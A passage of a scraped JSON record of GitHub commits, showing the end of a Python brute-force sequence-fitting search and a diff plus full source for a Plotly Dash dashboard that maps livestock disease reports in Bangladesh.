brute_force_grid_search(sequence, upper_bound = 5, lower_bound = -5, break_threshold=7):\n  # constant term, polynomial of index, previous term, previous two terms, ...\n  coeff = sorted(list(range(upper_bound, lower_bound-1, -1)), key=lambda x: abs(x))\n  base = len(coeff)\n  digit_to_coeff = {i: coeff[i] for i in range(base)}\n  \n  i = 0\n\n  def int_to_base_helper(num, base):\n    ret = []\n    while num >= base:\n      ret.append(num % base)\n      num = num \/\/ base\n    return ret\n  \n  while True:\n    for j in range(base**i, base**(i+1)):\n      if j == 0:\n        continue\n      term_coeffs = [digit_to_coeff[c] for c in int_to_base_helper(j, base)]+[0]*50\n      f = Function()\n      for k, term in enumerate(candidate_term_list):\n        if term_coeffs[k] != 0:\n          term_copy = deepcopy(term)\n          term_copy.updateCoeff(term_coeffs[k])\n          f.addTerm(term_copy)\n      \n      if f.startIndex() > len(sequence):\n        continue\n      perfect_fit = True\n      for n in range(f.startIndex(), len(sequence)+1):\n        if f.evaluate(sequence, n) != sequence[n-1]:\n          perfect_fit = False\n          break\n      if perfect_fit:\n        return f\n    i += 1\n\n    print('i =',i)\n\n    if i >= break_threshold:\n      print(f'Search terminated! Searched {base}^{break_threshold} combinations but cannot find solution')\n      return None\n\n\n\n\n\n"}},"msg":"Update brute_force_solver.py"}},"https:\/\/github.com\/road86\/bahis-dash":{"24d96a7c0df9bf66e3499d3fafd651aaac20f8de":{"url":"https:\/\/api.github.com\/repos\/road86\/bahis-dash\/commits\/24d96a7c0df9bf66e3499d3fafd651aaac20f8de","html_url":"https:\/\/github.com\/road86\/bahis-dash\/commit\/24d96a7c0df9bf66e3499d3fafd651aaac20f8de","message":"Update bahisdashplt.py\n\nfurther brute force get to know code","sha":"24d96a7c0df9bf66e3499d3fafd651aaac20f8de","keyword":"brute force update","diff":"diff --git a\/plotlydash\/bahisdashplt.py b\/plotlydash\/bahisdashplt.py\nindex b7fa29e..fe9ee59 100644\n--- a\/plotlydash\/bahisdashplt.py\n+++ b\/plotlydash\/bahisdashplt.py\n@@ -14,6 +14,8 @@\n from datetime import datetime, timedelta, date\n from dash.dependencies import Input, Output\n from dash_bootstrap_templates import ThemeChangerAIO, template_from_url\n+import json \n+import altair as alt    \n \n \n # dbc_css = \"\/dbc.min.css\"\n@@ -29,6 +31,14 @@\n bahis_sd = pd.read_csv(sourcefilename)\n img_logo= 'assets\/Logo.png'\n \n+path0= \"geodata\/geoBoundaries-BGD-ADM0_simplified.geojson\" #1 Nation # found shapefiles from the data.humdata.org\n+path1= \"C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/geodata\/geoBoundaries-BGD-ADM1_simplified.geojson\" #8 Division\n+path2= \"geodata\/geoBoundaries-BGD-ADM2_simplified.geojson\" #64 District\n+path3= \"geodata\/geoBoundaries-BGD-ADM3_simplified.geojson\" #495 Upazila\n+path4= \"geodata\/geoBoundaries-BGD-ADM4_simplified.geojson\" #4562 Union\n+\n+\n+\n def fetchsourcedata():\n     bahis_sd = pd.read_csv(sourcefilename) ################CC\n     bahis_sd['basic_info_division'] = pd.to_numeric(bahis_sd['basic_info_division'])\n@@ -182,6 +192,63 @@ def fIndicator():\n     className=\"mb-4\",\n )\n \n+def open_data(path):\n+    with open(path) as f:\n+        data = json.load(f)\n+        return data\n+\n+def plot_map(path, loc, subd_bahis_sourcedata, title, pname, splace, variab, labl):\n+    #path= path1\n+    subDist=bahis_geodata[(bahis_geodata[\"loc_type\"]==loc)]\n+    reports = subd_bahis_sourcedata[title].value_counts().to_frame()\n+    reports[pname] = reports.index\n+    reports= reports.loc[reports[pname] != 'nan']    \n+    data = open_data(path)\n+    for i in range(reports.shape[0]):\n+        reports[pname].iloc[i] = subDist.loc[subDist['value']==int(reports[pname].iloc[i]),'name'].iloc[0]\n+    reports[pname]=reports[pname].str.title()                   \n+    for i in data['features']:\n+        i['id']= i['properties']['shapeName'].replace(splace,\"\")\n+\n+    fig = px.choropleth_mapbox(reports, geojson=data, locations=pname, color=title,\n+                            color_continuous_scale=\"Viridis\",\n+                            range_color=(0, reports[title].max()),\n+                            mapbox_style=\"carto-positron\",\n+                            zoom=5.5, center = {\"lat\": 23.7, \"lon\": 90},\n+                            opacity=0.5,\n+                            labels={variab:labl}\n+                          )\n+    fig.update_layout(autosize=True, margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0}, coloraxis_showscale= False) #width= 1000, height=600, \n+    return fig\n+\n+loc=1\n+title='basic_info_division'\n+pname='divisionname'\n+splace=' Division' \n+variab='division'\n+labl='Incidences per division'\n+figMap = plot_map(path1, loc, bahis_sourcedata, title, pname, splace, variab, labl)\n+                        \n+\n+figReport= go.Figure()\n+#region_placeholder.header('Report Dynamics for: Bangladesh')\n+tmp=bahis_sourcedata['basic_info_date'].dt.date.value_counts()\n+tmp=tmp.reset_index()\n+tmp=tmp.rename(columns={'index':'date'})\n+tmp['date'] = pd.to_datetime(tmp['date'])    \n+tots= str(bahis_sourcedata.shape[0])\n+\n+figReport= px.bar(tmp, x='date', y='basic_info_date')\n+    \n+#     tmp2w, height=600).mark_line(point=alt.OverlayMarkDef(color=\"red\")).encode( #interpolate='basis').encode(\n+#     alt.X('date:T', title='report date', axis= alt.Axis(format='%Y %B %d')), # scale= alt.Scale(nice={'interval': 'week', 'step': 4})), \n+#     alt.Y('basic_info_date:Q', title='reports'),\n+#     color=alt.Color('Category:N', legend=None)\n+#     ).properties(title='Registered reports :  ' + tots)\n+# altair_chart(line_chart, use_container_width=True)\n+\n+\n+\n df = px.data.gapminder()\n years = df.year.unique()\n continents = df.continent.unique()\n@@ -205,8 +272,10 @@ def fIndicator():\n tab1 = dbc.Tab([dcc.Graph(id=\"line-chart\")], label=\"Line Chart\")\n tab2 = dbc.Tab([dcc.Graph(id=\"scatter-chart\")], label=\"Scatter Chart\")\n tab3 = dbc.Tab([table], label=\"Table\", className=\"p-4\")\n-tabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))\n+#tabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))\n+\n \n+tabs=dbc.Card(dcc.Graph(figure=figReport))\n \n \n # stylesheet with the .dbc class\n@@ -241,7 +310,10 @@ def fIndicator():\n                      ], width=2),\n                 dbc.Col([\n                     dbc.Row([dbc.Card([html.H4(\"Description\")], body=True)]),\n-                    dbc.Row([dbc.Card([html.H4(\"MAP\")], body=True)])\n+                    dbc.Row([dbc.Card(dcc.Graph(\n+                                    id='Map',\n+                                    figure=figMap\n+                                    ), body=True)])\n                      ], width=5\n                     ),\n                 dbc.Col([tabs], width=5),\n","files":{"\/plotlydash\/bahisdashplt.py":{"changes":[{"diff":"\n tab1 = dbc.Tab([dcc.Graph(id=\"line-chart\")], label=\"Line Chart\")\n tab2 = dbc.Tab([dcc.Graph(id=\"scatter-chart\")], label=\"Scatter Chart\")\n tab3 = dbc.Tab([table], label=\"Table\", className=\"p-4\")\n-tabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))\n+#tabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))\n+\n \n+tabs=dbc.Card(dcc.Graph(figure=figReport))\n \n \n # stylesheet with the .dbc class\n","add":3,"remove":1,"filename":"\/plotlydash\/bahisdashplt.py","badparts":["tabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))"],"goodparts":["tabs=dbc.Card(dcc.Graph(figure=figReport))"]},{"diff":"\n                      ], width=2),\n                 dbc.Col([\n                     dbc.Row([dbc.Card([html.H4(\"Description\")], body=True)]),\n-                    dbc.Row([dbc.Card([html.H4(\"MAP\")], body=True)])\n+                    dbc.Row([dbc.Card(dcc.Graph(\n+                                    id='Map',\n+                                    figure=figMap\n+                                    ), body=True)])\n                      ], width=5\n                     ),\n                 dbc.Col([tabs], width=5),\n","add":4,"remove":1,"filename":"\/plotlydash\/bahisdashplt.py","badparts":["                    dbc.Row([dbc.Card([html.H4(\"MAP\")], body=True)])"],"goodparts":["                    dbc.Row([dbc.Card(dcc.Graph(","                                    id='Map',","                                    figure=figMap","                                    ), body=True)])"]}],"source":"\n \"\"\" Created on Wed Dec 28 15:12:34 2022 @author: yoshka \"\"\" from dash import Dash, dash_table, dcc, html import plotly.express as px import dash_bootstrap_components as dbc import pandas as pd import plotly.graph_objects as go from datetime import datetime, timedelta, date from dash.dependencies import Input, Output from dash_bootstrap_templates import ThemeChangerAIO, template_from_url img_logo='assets\/Logo.png' gifpath='C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/logos\/' sourcepath='C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/exported_data\/' geofilename=sourcepath +'newbahis_geo_cluster.csv' sourcefilename=sourcepath +'preped_data2.csv' bahis_sd=pd.read_csv(sourcefilename) img_logo='assets\/Logo.png' def fetchsourcedata(): bahis_sd=pd.read_csv(sourcefilename) bahis_sd['basic_info_division']=pd.to_numeric(bahis_sd['basic_info_division']) bahis_sd['basic_info_district']=pd.to_numeric(bahis_sd['basic_info_district']) bahis_sd['basic_info_upazila']=pd.to_numeric(bahis_sd['basic_info_upazila']) bahis_sd['basic_info_date']=pd.to_datetime(bahis_sd['basic_info_date']) return bahis_sd bahis_sourcedata=fetchsourcedata() def fetchgeodata(): return pd.read_csv(geofilename) bahis_geodata=fetchgeodata() def fetchdiseaselist(): dislis=bahis_sourcedata['top_diagnosis'].unique() dislis=pd.DataFrame(dislis, columns=['Disease']) dislis.sort_values(by=['Disease']) ddDList=dislis['Disease'] return ddDList.tolist() ddDList=fetchdiseaselist() ddDList.insert(0, 'Select All') def fetchDivisionlist(): ddDivlist=bahis_geodata[(bahis_geodata[\"loc_type\"]==1)]['name'].str.capitalize() ddDivlist.name='Division' ddDivlist=ddDivlist.sort_values() return ddDivlist.tolist() ddDivlist=fetchDivisionlist() ddDivlist.insert(0,'Select All') start_date=min(bahis_sourcedata['basic_info_date']).date() end_date=max(bahis_sourcedata['basic_info_date']).date() start_date=date(2021, 1, 1) def natNo(): mask=(bahis_sourcedata['basic_info_date']> datetime.now()-timedelta(days=30)) &(bahis_sourcedata['basic_info_date'] < datetime.now()) tmp_sub_data=bahis_sourcedata['basic_info_date'].loc[mask] diff=tmp_sub_data.shape[0] tmp_sub_data=bahis_sourcedata['patient_info_sick_number'].loc[mask] diffsick=int(tmp_sub_data.sum().item()) tmp_sub_data=bahis_sourcedata['patient_info_dead_number'].loc[mask] diffdead=int(tmp_sub_data.sum().item()) return([diff, diffsick, diffdead]) [diff, diffsick, diffdead]=natNo() def fIndicator(): figIndic=go.Figure() figIndic.add_trace(go.Indicator( mode=\"number+delta\", title='Total Reports', value=bahis_sourcedata.shape[0], delta={'reference': diff}, domain={'row': 0, 'column': 0})) figIndic.add_trace(go.Indicator( mode=\"number+delta\", title='Sick Animals', value=bahis_sourcedata['patient_info_sick_number'].sum(), delta={'reference': diffsick}, domain={'row': 0, 'column': 1})) figIndic.add_trace(go.Indicator( mode=\"number+delta\", title='Dead Animals', value=bahis_sourcedata['patient_info_dead_number'].sum(), delta={'reference': diffdead}, domain={'row': 0, 'column': 2})) figIndic.update_layout(height=250, grid={'rows': 1, 'columns': 3}, ) return figIndic dpDate=html.Div( [ dcc.DatePickerRange( id='my-date-picker-range', min_date_allowed=start_date, max_date_allowed=end_date, initial_visible_month=date(2022, 1, 1), start_date=date(2021, 1, 1), end_date=end_date ), ], className='mb-4', ) ddDivision=html.Div( [ dbc.Label(\"Select Division\"), dcc.Dropdown( ddDivlist, \"pop\", id=\"cDivision\", clearable=False, ), ], className=\"mb-4\", ) ddDistrict=html.Div( [ dbc.Label(\"Select District\"), dcc.Dropdown( [\"District\", \"Funny Disease\", \"Don't care Disease\"], \"pop\", id=\"cDistrict\", clearable=False, ), ], className=\"mb-4\", ) ddUpazila=html.Div( [ dbc.Label(\"Select Upazila\"), dcc.Dropdown( [\"Upazila\", \"Funny Disease\", \"Don't care Disease\"], \"pop\", id=\"cUpazila\", clearable=False, ), ], className=\"mb-4\", ) ddDisease=html.Div( [ dbc.Label(\"Select disease\"), dcc.Dropdown( ddDList, \"pop\", id=\"cDisease\", clearable=False, ), ], className=\"mb-4\", ) df=px.data.gapminder() years=df.year.unique() continents=df.continent.unique() table=html.Div( dash_table.DataTable( id=\"table\", columns=[{\"name\": i, \"id\": i, \"deletable\": True} for i in df.columns], data=df.to_dict(\"records\"), page_size=10, editable=True, cell_selectable=True, filter_action=\"native\", sort_action=\"native\", style_table={\"overflowX\": \"auto\"}, row_selectable=\"multi\", ), className=\"dbc-row-selectable\", ) tab1=dbc.Tab([dcc.Graph(id=\"line-chart\")], label=\"Line Chart\") tab2=dbc.Tab([dcc.Graph(id=\"scatter-chart\")], label=\"Scatter Chart\") tab3=dbc.Tab([table], label=\"Table\", className=\"p-4\") tabs=dbc.Card(dbc.Tabs([tab1, tab2, tab3])) dbc_css=\"https:\/\/cdn.jsdelivr.net\/gh\/AnnMarieW\/dash-bootstrap-templates\/dbc.min.css\" app=Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP, dbc_css]) header=html.H4( \"BAHIS dashboard\", className=\"bg-primary text-white p-2 mb-2 text-center\" ) row=html.Div( [ dbc.Row( [ dbc.Col(html.Img(src=img_logo, style={'width':'100%', 'margin-left': '20px'}), width=3), dbc.Col(html.Div(header), width=8), dbc.Col(html.Div(\"Placeholder\"), width=1), ]), dbc.Row(), dbc.Row( [ dbc.Col(html.B(html.H1(\"National numbers\")), width=2), dbc.Col(dcc.Graph( id='indicators', figure=fIndicator() ),width=8), ], justify=\"center\", align=\"center\", className=\"mb-42\"), dbc.Row( [ dbc.Col( [dbc.Card([dpDate, ddDisease, ddDivision, ddDistrict, ddUpazila], body=True) ], width=2), dbc.Col([ dbc.Row([dbc.Card([html.H4(\"Description\")], body=True)]), dbc.Row([dbc.Card([html.H4(\"MAP\")], body=True)]) ], width=5 ), dbc.Col([tabs], width=5), ] ), ] ) slider=html.Div( [ dbc.Label(\"Select Years\"), dcc.RangeSlider( years[0], years[-1], 5, id=\"years\", marks=None, tooltip={\"placement\": \"bottom\", \"always_visible\": True}, value=[years[2], years[-2]], className=\"p-0\", ), ], className=\"mb-4\", ) theme_colors=[ \"primary\", \"secondary\", \"success\", \"warning\", \"danger\", \"info\", \"light\", \"dark\", \"link\", ] colors=html.Div( [dbc.Button(f\"{color}\", color=f\"{color}\", size=\"sm\") for color in theme_colors] ) colors=html.Div([\"Theme Colors:\", colors], className=\"mt-2\") app.layout=dbc.Container( [ html.Div(\"Preselect local\/server\"), row, dbc.Row( [ dbc.Col( [ ThemeChangerAIO(aio_id=\"theme\") ], width=4, ), ] ), ], fluid=True, className=\"dbc\", ) @app.callback( Output(\"line-chart\", \"figure\"), Output(\"scatter-chart\", \"figure\"), Output(\"table\", \"data\"), Input(\"continents\", \"value\"), Input(\"years\", \"value\"), Input(ThemeChangerAIO.ids.radio(\"theme\"), \"value\"), ) def update_line_chart(continent, yrs, theme): if continent==[]: return{},{},[] dff=df[df.year.between(yrs[0], yrs[1])] dff=dff[dff.continent.isin(continent)] data=dff.to_dict(\"records\") fig_scatter=px.scatter( df.query(f\"year=={yrs[1]} & continent=={continent}\"), x=\"gdpPercap\", y=\"lifeExp\", size=\"pop\", color=\"continent\", log_x=True, size_max=60, template=template_from_url(theme), title=\"Gapminder %s: %s theme\" %(yrs[1], template_from_url(theme)), ) return fig, fig_scatter, data if __name__==\"__main__\": app.run_server(debug=True) ","sourceWithComments":"# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Wed Dec 28 15:12:34 2022\n\n@author: yoshka\n\"\"\"\n\n\nfrom dash import Dash, dash_table, dcc, html #, dbc \nimport plotly.express as px\nimport dash_bootstrap_components as dbc\nimport pandas as pd\nimport plotly.graph_objects as go\nfrom datetime import datetime, timedelta, date\nfrom dash.dependencies import Input, Output\nfrom dash_bootstrap_templates import ThemeChangerAIO, template_from_url\n\n\n# dbc_css = \"\/dbc.min.css\"\n# app = Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP, dbc_css])\n\n########################\nimg_logo= 'assets\/Logo.png'\n\ngifpath = 'C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/logos\/'\nsourcepath = 'C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/exported_data\/'\ngeofilename = sourcepath + 'newbahis_geo_cluster.csv'   # the available geodata from the bahis project\nsourcefilename =sourcepath + 'preped_data2.csv'   \nbahis_sd = pd.read_csv(sourcefilename)\nimg_logo= 'assets\/Logo.png'\n\ndef fetchsourcedata():\n    bahis_sd = pd.read_csv(sourcefilename) ################CC\n    bahis_sd['basic_info_division'] = pd.to_numeric(bahis_sd['basic_info_division'])\n    bahis_sd['basic_info_district'] = pd.to_numeric(bahis_sd['basic_info_district'])\n    bahis_sd['basic_info_upazila'] = pd.to_numeric(bahis_sd['basic_info_upazila'])\n    bahis_sd['basic_info_date'] = pd.to_datetime(bahis_sd['basic_info_date'])\n    return bahis_sd\nbahis_sourcedata= fetchsourcedata()\n\ndef fetchgeodata():\n    return pd.read_csv(geofilename)\nbahis_geodata= fetchgeodata()\n\n\n# app = Dash(__name__)\n\n# colors = {\n#     'background': '#ffffff',\n#     'text': '#000000'\n# }\n\ndef fetchdiseaselist():\n    dislis= bahis_sourcedata['top_diagnosis'].unique()\n    dislis= pd.DataFrame(dislis, columns=['Disease'])\n    dislis.sort_values(by=['Disease'])\n    ddDList= dislis['Disease']\n    return ddDList.tolist()\nddDList= fetchdiseaselist()\nddDList.insert(0, 'Select All')\n\ndef fetchDivisionlist():   \n    ddDivlist=bahis_geodata[(bahis_geodata[\"loc_type\"]==1)]['name'].str.capitalize()\n    ddDivlist.name='Division'\n    ddDivlist=ddDivlist.sort_values()\n    return ddDivlist.tolist()\nddDivlist=fetchDivisionlist()\nddDivlist.insert(0,'Select All')\n\nstart_date=min(bahis_sourcedata['basic_info_date']).date()\nend_date=max(bahis_sourcedata['basic_info_date']).date()\nstart_date=date(2021, 1, 1)\n\ndef natNo():\n    mask=(bahis_sourcedata['basic_info_date']> datetime.now()-timedelta(days=30)) & (bahis_sourcedata['basic_info_date'] < datetime.now())\n    tmp_sub_data=bahis_sourcedata['basic_info_date'].loc[mask]\n    diff=tmp_sub_data.shape[0]\n    \n    tmp_sub_data=bahis_sourcedata['patient_info_sick_number'].loc[mask]\n    diffsick=int(tmp_sub_data.sum().item())\n    \n    tmp_sub_data=bahis_sourcedata['patient_info_dead_number'].loc[mask]\n    diffdead=int(tmp_sub_data.sum().item())\n    return([diff, diffsick, diffdead])\n\n[diff, diffsick, diffdead]=natNo()\n\ndef fIndicator():\n    figIndic = go.Figure()\n    \n    figIndic.add_trace(go.Indicator(\n        mode = \"number+delta\",\n        title = 'Total Reports',\n        value = bahis_sourcedata.shape[0], #f\"{bahis_sourcedata.shape[0]:,}\"),\n        delta = {'reference': diff}, #'f\"{diff:,}\"},\n        domain = {'row': 0, 'column': 0}))\n    \n    figIndic.add_trace(go.Indicator(\n        mode = \"number+delta\",\n        title = 'Sick Animals',\n        value = bahis_sourcedata['patient_info_sick_number'].sum(), #f\"{int(bahis_sourcedata['patient_info_sick_number'].sum()):,}\",\n        delta= {'reference': diffsick}, #f\"{diffsick:,}\",\n        domain = {'row': 0, 'column': 1}))\n    \n    figIndic.add_trace(go.Indicator(\n        mode = \"number+delta\",\n        title = 'Dead Animals',\n        value = bahis_sourcedata['patient_info_dead_number'].sum(), #f\"{int(bahis_sourcedata['patient_info_dead_number'].sum()):,}\",\n        delta = {'reference': diffdead}, #f\"{diffdead:,}\",\n        domain = {'row': 0, 'column': 2}))\n    \n    figIndic.update_layout(height=250,\n        grid = {'rows': 1, 'columns': 3},# 'pattern': \"independent\"},\n        #?template=template_from_url(theme),\n    \n        )\n    return figIndic\n\ndpDate = html.Div(\n    [\n         dcc.DatePickerRange(\n            id='my-date-picker-range',\n            min_date_allowed=start_date,\n            max_date_allowed=end_date,\n            initial_visible_month=date(2022, 1, 1),\n            start_date=date(2021, 1, 1),\n            end_date=end_date\n            ),\n     ],\n    className='mb-4',\n)\n\nddDivision = html.Div(\n    [\n        dbc.Label(\"Select Division\"),\n        dcc.Dropdown(\n            ddDivlist,\n            \"pop\",\n            id=\"cDivision\",\n            clearable=False,\n        ),\n    ],\n    className=\"mb-4\",\n)\n\nddDistrict = html.Div(\n    [\n        dbc.Label(\"Select District\"),\n        dcc.Dropdown(\n            [\"District\", \"Funny Disease\", \"Don't care Disease\"],\n            \"pop\",\n            id=\"cDistrict\",\n            clearable=False,\n        ),\n    ],\n    className=\"mb-4\",\n)\n\nddUpazila = html.Div(\n    [\n        dbc.Label(\"Select Upazila\"),\n        dcc.Dropdown(\n            [\"Upazila\", \"Funny Disease\", \"Don't care Disease\"],\n            \"pop\",\n            id=\"cUpazila\",\n            clearable=False,\n        ),\n    ],\n    className=\"mb-4\",\n)\n\nddDisease = html.Div(\n    [\n        dbc.Label(\"Select disease\"),\n        dcc.Dropdown(\n            ddDList,\n            \"pop\",\n            id=\"cDisease\",\n            clearable=False,\n        ),\n    ],\n    className=\"mb-4\",\n)\n\ndf = px.data.gapminder()\nyears = df.year.unique()\ncontinents = df.continent.unique()\n\ntable = html.Div(\n    dash_table.DataTable(\n        id=\"table\",\n        columns=[{\"name\": i, \"id\": i, \"deletable\": True} for i in df.columns],\n        data=df.to_dict(\"records\"),\n        page_size=10,\n        editable=True,\n        cell_selectable=True,\n        filter_action=\"native\",\n        sort_action=\"native\",\n        style_table={\"overflowX\": \"auto\"},\n        row_selectable=\"multi\",\n    ),\n    className=\"dbc-row-selectable\",\n)\n\ntab1 = dbc.Tab([dcc.Graph(id=\"line-chart\")], label=\"Line Chart\")\ntab2 = dbc.Tab([dcc.Graph(id=\"scatter-chart\")], label=\"Scatter Chart\")\ntab3 = dbc.Tab([table], label=\"Table\", className=\"p-4\")\ntabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))\n\n\n\n# stylesheet with the .dbc class\ndbc_css = \"https:\/\/cdn.jsdelivr.net\/gh\/AnnMarieW\/dash-bootstrap-templates\/dbc.min.css\"\napp = Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP, dbc_css])\n\nheader = html.H4(\n    \"BAHIS dashboard\", className=\"bg-primary text-white p-2 mb-2 text-center\"\n)\n\nrow = html.Div(\n    [\n        dbc.Row(\n            [\n                dbc.Col(html.Img(src=img_logo, style={'width':'100%', 'margin-left': '20px'} ), width=3),\n                dbc.Col(html.Div(header), width=8),\n                dbc.Col(html.Div(\"Placeholder\"), width=1),\n            ]),\n        dbc.Row(),\n        dbc.Row(\n            [\n                dbc.Col(html.B(html.H1(\"National numbers\")), width=2),\n                dbc.Col(dcc.Graph(\n                                id='indicators',\n                                figure=fIndicator()\n                            ),width=8),  \n            ], justify=\"center\", align=\"center\", className=\"mb-42\"), #\"h-50\"),\n        dbc.Row(\n            [\n                dbc.Col(\n                    [dbc.Card([dpDate, ddDisease, ddDivision, ddDistrict, ddUpazila], body=True)\n                     ], width=2),\n                dbc.Col([\n                    dbc.Row([dbc.Card([html.H4(\"Description\")], body=True)]),\n                    dbc.Row([dbc.Card([html.H4(\"MAP\")], body=True)])\n                     ], width=5\n                    ),\n                dbc.Col([tabs], width=5),\n#                dbc.Col(html.Div(\"One of three columns\"), width=3),\n            ]\n        ),\n    ]\n)\n\n# checklist = html.Div(\n#     [\n#         dbc.Label(\"Select Continents\"),\n#         dbc.Checklist(\n#             id=\"continents\",\n#             options=[{\"label\": i, \"value\": i} for i in continents],\n#             value=continents,\n#             inline=True,\n#         ),\n#     ],\n#     className=\"mb-4\",\n# )\n\nslider = html.Div(\n    [\n        dbc.Label(\"Select Years\"),\n        dcc.RangeSlider(\n            years[0],\n            years[-1],\n            5,\n            id=\"years\",\n            marks=None,\n            tooltip={\"placement\": \"bottom\", \"always_visible\": True},\n            value=[years[2], years[-2]],\n            className=\"p-0\",\n        ),\n    ],\n    className=\"mb-4\",\n)\ntheme_colors = [\n    \"primary\",\n    \"secondary\",\n    \"success\",\n    \"warning\",\n    \"danger\",\n    \"info\",\n    \"light\",\n    \"dark\",\n    \"link\",\n]\ncolors = html.Div(\n    [dbc.Button(f\"{color}\", color=f\"{color}\", size=\"sm\") for color in theme_colors]\n)\ncolors = html.Div([\"Theme Colors:\", colors], className=\"mt-2\")\n\n\n# controls = dbc.Card(\n#     [dropdown, checklist, slider],\n#     body=True,\n# )\n\n# tab1 = dbc.Tab([dcc.Graph(id=\"line-chart\")], label=\"Line Chart\")\n# tab2 = dbc.Tab([dcc.Graph(id=\"scatter-chart\")], label=\"Scatter Chart\")\n# tab3 = dbc.Tab([table], label=\"Table\", className=\"p-4\")\n# tabs = dbc.Card(dbc.Tabs([tab1, tab2, tab3]))\n\napp.layout = dbc.Container(\n    [\n        html.Div(\"Preselect local\/server\"),\n        row,\n        dbc.Row(\n            [\n                dbc.Col(\n                    [\n                       # controls,\n                        ThemeChangerAIO(aio_id=\"theme\")\n                    ],\n                    width=4,\n                ),\n#                dbc.Col([tabs, colors], width=8),\n            ]\n        ),\n    ],\n    fluid=True,\n    className=\"dbc\",\n)\n\n\n@app.callback(\n\n\n    Output(\"line-chart\", \"figure\"),\n    Output(\"scatter-chart\", \"figure\"),\n    Output(\"table\", \"data\"),\n#    Input(\"indicator\", \"value\"),\n    Input(\"continents\", \"value\"),\n    Input(\"years\", \"value\"),\n    Input(ThemeChangerAIO.ids.radio(\"theme\"), \"value\"),\n)\ndef update_line_chart(continent, yrs, theme): #indicator, \n    if continent == []: # or indicator is None:\n        return {}, {}, []\n\n    dff = df[df.year.between(yrs[0], yrs[1])]\n    dff = dff[dff.continent.isin(continent)]\n    data = dff.to_dict(\"records\")\n\n    # fig = px.line(\n    #     dff,\n    #     x=\"year\",\n    #     y=indicator,\n    #     color=\"continent\",\n    #     line_group=\"country\",\n    #     template=template_from_url(theme),\n    # )\n\n    fig_scatter = px.scatter(\n        df.query(f\"year=={yrs[1]} & continent=={continent}\"),\n        x=\"gdpPercap\",\n        y=\"lifeExp\",\n        size=\"pop\",\n        color=\"continent\",\n        log_x=True,\n        size_max=60,\n        template=template_from_url(theme),\n        title=\"Gapminder %s: %s theme\" % (yrs[1], template_from_url(theme)),\n    )\n\n    return fig, fig_scatter, data\n\n\nif __name__ == \"__main__\":\n    app.run_server(debug=True)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n###############################\n\n\n# #gifpath = 'logos\/'\n# #sourcepath = 'exported_data\/'\n# gifpath = 'C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/logos\/'\n# sourcepath = 'C:\/Users\/yoshka\/Documents\/GitHub\/bahis-dash\/exported_data\/'\n# geofilename = sourcepath + 'newbahis_geo_cluster.csv'   # the available geodata from the bahis project\n# sourcefilename =sourcepath + 'preped_data2.csv'   \n# bahis_sd = pd.read_csv(sourcefilename)\n# img_logo= 'assets\/Logo.png'\n\n# def fetchsourcedata():\n# #    bahis_sd = pd.read_csv(sourcefilename) ################CC\n#     bahis_sd['basic_info_division'] = pd.to_numeric(bahis_sd['basic_info_division'])\n#     bahis_sd['basic_info_district'] = pd.to_numeric(bahis_sd['basic_info_district'])\n#     bahis_sd['basic_info_upazila'] = pd.to_numeric(bahis_sd['basic_info_upazila'])\n#     bahis_sd['basic_info_date'] = pd.to_datetime(bahis_sd['basic_info_date'])\n#     return bahis_sd\n# bahis_sourcedata= fetchsourcedata()\n\n# app = Dash(__name__)\n\n# colors = {\n#     'background': '#ffffff',\n#     'text': '#000000'\n# }\n\n# mask=(bahis_sourcedata['basic_info_date']> datetime.now()-timedelta(days=30)) & (bahis_sourcedata['basic_info_date'] < datetime.now())\n# tmp_sub_data=bahis_sourcedata['basic_info_date'].loc[mask]\n# diff=tmp_sub_data.shape[0]\n\n# tmp_sub_data=bahis_sourcedata['patient_info_sick_number'].loc[mask]\n# diffsick=int(tmp_sub_data.sum().item())\n\n# tmp_sub_data=bahis_sourcedata['patient_info_dead_number'].loc[mask]\n# diffdead=int(tmp_sub_data.sum().item())\n\n\n# fig = go.Figure()\n\n# fig.add_trace(go.Indicator(\n#     mode = \"number+delta\",\n#     value = bahis_sourcedata.shape[0], #f\"{bahis_sourcedata.shape[0]:,}\"),\n#     delta = {'reference': diff}, #'f\"{diff:,}\"},\n#     domain = {'row': 0, 'column': 0}))\n\n# fig.add_trace(go.Indicator(\n#     mode = \"number+delta\",\n#     value = bahis_sourcedata['patient_info_sick_number'].sum(), #f\"{int(bahis_sourcedata['patient_info_sick_number'].sum()):,}\",\n#     delta= {'reference': diffsick}, #f\"{diffsick:,}\",\n#     domain = {'row': 0, 'column': 1}))\n\n# fig.add_trace(go.Indicator(\n#     mode = \"number+delta\",\n#     value = bahis_sourcedata['patient_info_dead_number'].sum(), #f\"{int(bahis_sourcedata['patient_info_dead_number'].sum()):,}\",\n#     delta = {'reference': diffdead}, #f\"{diffdead:,}\",\n#     domain = {'row': 0, 'column': 2}))\n\n# fig.update_layout(\n#     grid = {'rows': 1, 'columns': 3, 'pattern': \"independent\"},\n\n#     )\n\n# bahis_sourcedata=bahis_sourcedata.loc[bahis_sourcedata['basic_info_date']>=pd.to_datetime(\"20190101\")]\n# start_date=min(bahis_sourcedata['basic_info_date']).date()\n# end_date=max(bahis_sourcedata['basic_info_date']).date()\n# dates=[start_date, end_date]\n\n\n\n# ######################## Layout\n\n# app.layout = html.Div(style={'backgroundColor': colors['background']}, children=[\n    \n#     html.Img(src=img_logo, style={'width':'25%', 'margin-left': '20px'} ),\n    \n   \n#     html.H1(\n#         children='BAHIS dashboard',\n#         style={\n#             'textAlign': 'left',\n#             'color': colors['text'],\n#             'font-family': 'Helvetica',\n#             'font_size': '72px',\n#         }\n#     ),\n    \n#     html.Div(children=[\n#         